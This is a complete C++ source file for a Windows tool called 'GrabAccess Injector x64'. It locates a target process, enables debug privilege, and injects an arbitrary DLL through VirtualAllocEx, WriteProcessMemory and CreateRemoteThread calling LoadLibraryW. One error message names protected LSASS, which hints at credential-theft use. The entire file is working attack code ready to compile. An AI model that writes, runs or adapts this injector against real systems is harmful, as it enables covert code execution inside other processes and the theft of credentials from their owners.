#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>

#include <cwchar>
#include <cstdio>

#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "Psapi.lib")

enum ExitCode {
    EXIT_OK = 0,
    EXIT_USAGE = 1,
    EXIT_PROCESS_NOT_FOUND = 2,
    EXIT_PRIVILEGE_ERROR = 3,
    EXIT_INJECTION_ERROR = 4
};

struct Options {
    const wchar_t* processName;
    DWORD processId;
    const wchar_t* dllPath;
    bool inject;
    bool help;
};

struct HandleGuard {
    HANDLE value;

    explicit HandleGuard(HANDLE handle = NULL) : value(handle) {}
    ~HandleGuard() {
        if (value && value != INVALID_HANDLE_VALUE) {
            CloseHandle(value);
        }
    }

    operator HANDLE() const { return value; }
    HANDLE* out() { return &value; }

private:
    HandleGuard(const HandleGuard&);
    HandleGuard& operator=(const HandleGuard&);
};

struct RemoteMemoryGuard {
    HANDLE process;
    void* address;

    RemoteMemoryGuard(HANDLE processHandle = NULL, void* remoteAddress = NULL)
        : process(processHandle), address(remoteAddress) {}

    ~RemoteMemoryGuard() {
        if (process && address) {
            VirtualFreeEx(process, address, 0, MEM_RELEASE);
        }
    }

private:
    RemoteMemoryGuard(const RemoteMemoryGuard&);
    RemoteMemoryGuard& operator=(const RemoteMemoryGuard&);
};

static void PrintUsage() {
    std::fwprintf(stdout,
        L"GrabAccess Injector x64\n"
        L"\n"
        L"Usage:\n"
        L"  Injector.exe -n <process.exe> -i <dll path>\n"
        L"  Injector.exe --process-name <process.exe> --inject <dll path>\n"
        L"  Injector.exe -p <pid> -i <dll path>\n"
        L"\n"
        L"Supported subset: process name/PID lookup plus LoadLibraryW injection.\n");
}

static void PrintLastError(const wchar_t* action) {
    DWORD error = GetLastError();
    wchar_t* message = NULL;

    FormatMessageW(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        error,
        0,
        reinterpret_cast<wchar_t*>(&message),
        0,
        NULL);

    if (message) {
        std::fwprintf(stderr, L" %s failed: %lu: %s", action, error, message);
        LocalFree(message);
    } else {
        std::fwprintf(stderr, L" %s failed: %lu\n", action, error);
    }
}

static bool IsOption(const wchar_t* arg, const wchar_t* shortName, const wchar_t* longName) {
    return (_wcsicmp(arg, shortName) == 0) || (_wcsicmp(arg, longName) == 0);
}

static bool ParseDword(const wchar_t* text, DWORD* value) {
    wchar_t* end = NULL;
    unsigned long parsed = wcstoul(text, &end, 10);
    if (!text[0] || !end || *end != L'\0' || parsed == 0) {
        return false;
    }

    *value = static_cast<DWORD>(parsed);
    return true;
}

static bool ParseOptions(int argc, wchar_t** argv, Options* options) {
    ZeroMemory(options, sizeof(*options));

    for (int i = 1; i < argc; ++i) {
        const wchar_t* arg = argv[i];

        if (IsOption(arg, L"-h", L"--help") || _wcsicmp(arg, L"/?") == 0) {
            options->help = true;
            return true;
        }

        if (IsOption(arg, L"-n", L"--process-name")) {
            if (++i >= argc) {
                std::fwprintf(stderr, L" Missing process name.\n");
                return false;
            }
            options->processName = argv[i];
            continue;
        }

        if (IsOption(arg, L"-p", L"--process-id")) {
            if (++i >= argc || !ParseDword(argv[i], &options->processId)) {
                std::fwprintf(stderr, L" Invalid process id.\n");
                return false;
            }
            continue;
        }

        if (IsOption(arg, L"-i", L"--inject")) {
            options->inject = true;
            if ((i + 1) < argc && argv[i + 1][0] != L'-') {
                options->dllPath = argv[++i];
            }
            continue;
        }

        if (options->inject && !options->dllPath) {
            options->dllPath = arg;
            continue;
        }

        std::fwprintf(stderr, L" Unknown argument: %s\n", arg);
        return false;
    }

    if (!options->inject) {
        std::fwprintf(stderr, L" Missing action: -i <dll path>.\n");
        return false;
    }

    if (!options->dllPath) {
        std::fwprintf(stderr, L" Missing DLL path.\n");
        return false;
    }

    if (!options->processName && options->processId == 0) {
        std::fwprintf(stderr, L" Missing target process. Use -n or -p.\n");
        return false;
    }

    return true;
}

static bool EnablePrivilege(const wchar_t* privilegeName) {
    HANDLE tokenRaw = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tokenRaw)) {
        PrintLastError(L"OpenProcessToken");
        return false;
    }
    HandleGuard token(tokenRaw);

    TOKEN_PRIVILEGES privileges;
    ZeroMemory(&privileges, sizeof(privileges));
    privileges.PrivilegeCount = 1;

    if (!LookupPrivilegeValueW(NULL, privilegeName, &privileges.Privileges[0].Luid)) {
        PrintLastError(L"LookupPrivilegeValueW");
        return false;
    }

    privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(token, FALSE, &privileges, sizeof(privileges), NULL, NULL)) {
        PrintLastError(L"AdjustTokenPrivileges");
        return false;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        std::fwprintf(stderr, L" Privilege not assigned: %s\n", privilegeName);
        return false;
    }

    return true;
}

static DWORD FindProcessIdByName(const wchar_t* processName) {
    HandleGuard snapshot(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0));
    if (snapshot.value == INVALID_HANDLE_VALUE) {
        PrintLastError(L"CreateToolhelp32Snapshot");
        return 0;
    }

    PROCESSENTRY32W entry;
    ZeroMemory(&entry, sizeof(entry));
    entry.dwSize = sizeof(entry);

    if (!Process32FirstW(snapshot, &entry)) {
        PrintLastError(L"Process32FirstW");
        return 0;
    }

    do {
        if (_wcsicmp(entry.szExeFile, processName) == 0) {
            return entry.th32ProcessID;
        }
    } while (Process32NextW(snapshot, &entry));

    return 0;
}

static bool ResolveDllPath(const wchar_t* inputPath, wchar_t* outputPath, DWORD outputChars) {
    DWORD length = GetFullPathNameW(inputPath, outputChars, outputPath, NULL);
    if (length == 0 || length >= outputChars) {
        PrintLastError(L"GetFullPathNameW");
        return false;
    }

    DWORD attributes = GetFileAttributesW(outputPath);
    if (attributes == INVALID_FILE_ATTRIBUTES || (attributes & FILE_ATTRIBUTE_DIRECTORY)) {
        std::fwprintf(stderr, L" DLL not found: %s\n", outputPath);
        return false;
    }

    return true;
}

static const wchar_t* BaseNameOf(const wchar_t* path) {
    const wchar_t* slash = wcsrchr(path, L'\\');
    const wchar_t* fslash = wcsrchr(path, L'/');
    const wchar_t* last = slash > fslash ? slash : fslash;
    return last ? last + 1 : path;
}

static bool IsModuleLoaded(HANDLE process, const wchar_t* dllPath) {
    HMODULE modules[2048];
    DWORD bytesNeeded = 0;

    if (!EnumProcessModulesEx(process, modules, sizeof(modules), &bytesNeeded, LIST_MODULES_ALL)) {
        return false;
    }

    DWORD count = bytesNeeded / sizeof(HMODULE);
    const wchar_t* dllBaseName = BaseNameOf(dllPath);

    for (DWORD i = 0; i < count && i < (sizeof(modules) / sizeof(modules[0])); ++i) {
        wchar_t modulePath[MAX_PATH];
        modulePath[0] = L'\0';

        if (GetModuleFileNameExW(process, modules[i], modulePath, ARRAYSIZE(modulePath))) {
            if (_wcsicmp(modulePath, dllPath) == 0 || _wcsicmp(BaseNameOf(modulePath), dllBaseName) == 0) {
                return true;
            }
        }
    }

    return false;
}

static bool InjectDll(DWORD processId, const wchar_t* dllPath) {
    DWORD access =
        PROCESS_CREATE_THREAD |
        PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION |
        PROCESS_VM_WRITE |
        PROCESS_VM_READ;

    HandleGuard process(OpenProcess(access, FALSE, processId));
    if (!process) {
        PrintLastError(L"OpenProcess");
        std::fwprintf(stderr, L" Access denied can indicate protected LSASS / RunAsPPL.\n");
        return false;
    }

    SIZE_T pathBytes = (wcslen(dllPath) + 1) * sizeof(wchar_t);
    RemoteMemoryGuard remote(process, VirtualAllocEx(process, NULL, pathBytes, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    if (!remote.address) {
        PrintLastError(L"VirtualAllocEx");
        return false;
    }

    if (!WriteProcessMemory(process, remote.address, dllPath, pathBytes, NULL)) {
        PrintLastError(L"WriteProcessMemory");
        return false;
    }

    HMODULE kernel32 = GetModuleHandleW(L"kernel32.dll");
    if (!kernel32) {
        PrintLastError(L"GetModuleHandleW(kernel32.dll)");
        return false;
    }

    FARPROC loadLibrary = GetProcAddress(kernel32, "LoadLibraryW");
    if (!loadLibrary) {
        PrintLastError(L"GetProcAddress(LoadLibraryW)");
        return false;
    }

    HandleGuard thread(CreateRemoteThread(
        process,
        NULL,
        0,
        reinterpret_cast<LPTHREAD_START_ROUTINE>(loadLibrary),
        remote.address,
        0,
        NULL));
    if (!thread) {
        PrintLastError(L"CreateRemoteThread");
        return false;
    }

    DWORD waitResult = WaitForSingleObject(thread, 30000);
    if (waitResult != WAIT_OBJECT_0) {
        if (waitResult == WAIT_TIMEOUT) {
            std::fwprintf(stderr, L" Remote LoadLibraryW timed out.\n");
        } else {
            PrintLastError(L"WaitForSingleObject");
        }
        return false;
    }

    DWORD exitCode = 0;
    if (!GetExitCodeThread(thread, &exitCode)) {
        PrintLastError(L"GetExitCodeThread");
        return false;
    }

    if (exitCode == 0 && !IsModuleLoaded(process, dllPath)) {
        std::fwprintf(stderr, L" Remote LoadLibraryW failed for: %s\n", dllPath);
        return false;
    }

    return true;
}

int wmain(int argc, wchar_t** argv) {
    Options options;

    if (!ParseOptions(argc, argv, &options)) {
        PrintUsage();
        return EXIT_USAGE;
    }

    if (options.help) {
        PrintUsage();
        return EXIT_OK;
    }

#ifndef _WIN64
    std::fwprintf(stderr, L" This build must be x64 for the current GrabAccess flow.\n");
    return EXIT_USAGE;
#endif

    wchar_t dllPath[MAX_PATH];
    if (!ResolveDllPath(options.dllPath, dllPath, ARRAYSIZE(dllPath))) {
        return EXIT_USAGE;
    }

    DWORD processId = options.processId;
    if (processId == 0) {
        processId = FindProcessIdByName(options.processName);
        if (processId == 0) {
            std::fwprintf(stderr, L" Process not found: %s\n", options.processName);
            return EXIT_PROCESS_NOT_FOUND;
        }
    }

    if (!EnablePrivilege(SE_DEBUG_NAME)) {
        return EXIT_PRIVILEGE_ERROR;
    }

    std::fwprintf(stdout, L" Target PID: %lu\n", processId);
    std::fwprintf(stdout, L" DLL: %s\n", dllPath);

    if (!InjectDll(processId, dllPath)) {
        return EXIT_INJECTION_ERROR;
    }

    std::fwprintf(stdout, L" Injection completed.\n");
    return EXIT_OK;
}
